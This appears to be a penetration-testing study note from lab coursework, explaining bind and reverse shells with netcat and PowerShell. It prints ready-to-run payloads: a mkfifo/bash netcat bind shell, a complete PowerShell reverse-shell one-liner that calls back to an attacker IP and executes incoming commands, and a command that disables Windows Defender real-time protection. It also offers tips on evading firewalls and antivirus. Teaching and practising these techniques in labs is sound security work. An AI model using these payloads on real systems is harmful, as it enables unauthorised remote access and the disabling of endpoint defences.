# Shell Basics

## Overview

In penetration testing, establishing a shell on a target system is crucial for maintaining access and executing commands. This document covers the fundamentals of bind shells and reverse shells, which are the two primary methods for establishing shell connections.

## Bind Shells

### What Is It?

With a bind shell, the **target system** has a listener started and awaits a connection from the pentester's system (attack box). The target acts as the server, and the attack box acts as the client.

```
[Attack Box] -----> [Target System with Listener]
10.10.14.15         10.10.14.20:1337
```

### Challenges with Bind Shells

1. **Listener Requirement**: A listener must already be started on the target
2. **Firewall Restrictions**: Incoming firewall rules are typically strict
3. **NAT/PAT**: Network Address Translation with Port Address Translation blocks incoming connections
4. **OS Firewalls**: Windows and Linux firewalls block most incoming connections
5. **Network Position**: Requires being on the internal network already

### Practicing with GNU Netcat

Netcat (nc) is our "Swiss-Army Knife" for network connections:
- Functions over TCP, UDP, and Unix sockets
- Supports IPv4 & IPv6
- Can open and listen on sockets
- Operates as a proxy
- Handles text input and output

#### Basic Netcat Connection

**Step 1: Server (Target) - Start Netcat listener**
```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

**Step 2: Client (Attack Box) - Connect to listener**
```bash
kabaneridev@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

**Step 3: Server - Connection received**
```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

**Step 4: Test Communication**
```bash
# Client side
kabaneridev@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy

# Server side
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

### Establishing a Basic Bind Shell with Netcat

The above example only creates a TCP session for text communication. For a real bind shell, we need to serve the system shell:

**Server - Binding a Bash shell to the TCP session**
```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Client - Connecting to bind shell on target**
```bash
kabaneridev@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$
```

#### Payload Breakdown

The bind shell payload consists of:
- `rm -f /tmp/f`: Remove existing named pipe
- `mkfifo /tmp/f`: Create named pipe (FIFO)
- `cat /tmp/f | /bin/bash -i 2>&1`: Read from pipe and execute in bash with interactive mode
- `nc -l 10.129.41.200 7777 > /tmp/f`: Listen on port and redirect output to pipe

### Security Considerations

Bind shells are easier to defend against because:
- Incoming connections are more likely to be detected
- Firewalls typically block incoming connections
- Standard ports don't help much with incoming traffic
- Detection systems monitor for unusual listeners

## Reverse Shells

### What Is It?

With a reverse shell, the **attack box** has a listener running, and the **target** initiates the connection. The attack box acts as the server, and the target acts as the client.

```
[Attack Box with Listener] <----- [Target System]
10.10.14.15:1337                  10.10.14.20
```

### Advantages of Reverse Shells

1. **Firewall Evasion**: Outbound connections are less likely to be blocked
2. **Admin Oversight**: Admins often overlook outbound connections
3. **Common Ports**: Can use ports like 80, 443, 53 that are rarely blocked
4. **Better Detection Evasion**: Harder to detect than incoming connections

### Useful Resources

- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md): Contains various reverse shell payloads
- Remember: Admins are aware of public repositories and may tune security controls accordingly

### Hands-on With A Simple Reverse Shell in Windows

#### Step 1: Start Netcat Listener (Attack Box)

```bash
kabaneridev@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

**Why Port 443?**
- Common HTTPS port
- Rarely blocked outbound
- Appears legitimate
- Organizations rely on HTTPS for daily operations

**Note**: Advanced firewalls with deep packet inspection (DPI) and Layer 7 visibility may still detect reverse shells regardless of port.

#### Step 2: PowerShell Reverse Shell (Target)

**Key Considerations:**
- What applications are present on the target?
- What shell languages are available?
- Use "living off the land" techniques when possible
- Netcat is not native to Windows

**PowerShell Reverse Shell One-liner:**
```powershell
$LHOST = "10.10.14.55"; $LPORT = 7777; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

#### Step 3: Dealing with Antivirus

**Common AV Response:**
```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**Disable Windows Defender (Administrative PowerShell):**
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Step 4: Successful Connection

**Attack Box:**
```bash
kabaneridev@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

### PowerShell Reverse Shell Payload Breakdown

The PowerShell reverse shell payload consists of:

1. **TCP Client Creation**: `New-Object System.Net.Sockets.TCPClient('IP',PORT)`
2. **Stream Management**: `$client.GetStream()`
3. **Data Buffer**: `[byte[]]$bytes = 0..65535|%{0}`
4. **Read Loop**: Continuously read from stream
5. **Command Execution**: `iex $data` (Invoke-Expression)
6. **Output Formatting**: Add PS prompt and path
7. **Data Transmission**: Send results back to attack box
8. **Connection Management**: Flush and close when done

### Common Ports for Reverse Shells

**Commonly Allowed Outbound Ports:**
- **80** (HTTP)
- **443** (HTTPS)
- **53** (DNS)
- **22** (SSH)
- **21** (FTP)
- **25** (SMTP)
- **110** (POP3)
- **143** (IMAP)

**Why These Ports Work:**
- Essential for business operations
- Rarely blocked by firewalls
- Less suspicious in network traffic
- Blend in with legitimate traffic

### Best Practices

#### For Bind Shells:
- Use only when necessary
- Consider firewall implications
- Test from internal network position
- Use common service ports when possible

#### For Reverse Shells:
- Prefer over bind shells when possible
- Use common outbound ports
- Consider AV/EDR evasion techniques
- Test payload delivery methods
- Understand target environment

#### General Considerations:
- Always test in controlled environments first
- Understand network topology
- Consider detection mechanisms
- Have backup methods ready
- Document successful techniques

### Troubleshooting

**Common Issues:**
1. **Connection Refused**: Check firewall rules and port availability
2. **AV Detection**: Use evasion techniques or disable temporarily
3. **Network Restrictions**: Try different ports or protocols
4. **Payload Failures**: Verify syntax and target compatibility
5. **Unstable Connections**: Check network stability and MTU issues

**Debugging Commands:**
```bash
# Check listening ports
netstat -tlnp

# Test connectivity
telnet target_ip target_port

# Check firewall status (Linux)
ufw status

# Check firewall status (Windows)
netsh advfirewall show allprofiles
```

## Summary

Understanding shell basics is fundamental to penetration testing:

- **Bind Shells**: Target listens, attacker connects (harder to achieve)
- **Reverse Shells**: Attacker listens, target connects (preferred method)
- **Netcat**: Swiss-Army knife for network connections
- **PowerShell**: Native Windows capability for reverse shells
- **Port Selection**: Use common ports for better success rates
- **Evasion**: Consider AV/EDR and firewall restrictions

The next sections will cover advanced payloads, platform-specific techniques, and web shells for maintaining persistence and escalating privileges. 